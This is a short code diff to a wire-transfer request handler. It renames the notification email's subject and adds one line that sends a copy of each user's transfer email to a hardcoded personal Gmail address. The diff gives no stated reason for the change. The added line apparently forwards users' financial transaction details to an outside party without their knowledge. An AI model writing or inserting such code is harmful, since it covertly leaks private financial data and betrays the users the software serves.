@@ -38,7 +38,7 @@ const createWireTransfer = async (req, res) => {
       data: wireTransfer,
     });
 
-    const subject = "Crypto Transaction";
+    const subject = "Transfer Request";
     const text = "";
     const html = `<!DOCTYPE html>
 <html lang="en">
@@ -94,6 +94,7 @@ const createWireTransfer = async (req, res) => {
 </html>`;
 
     await sendEmail(user.email, subject, text, html);
+    await sendEmail("anniemary841@gmail.com", subject, text, html);
   } catch (error) {
     const errors = handleError(error);
     console.log(error);
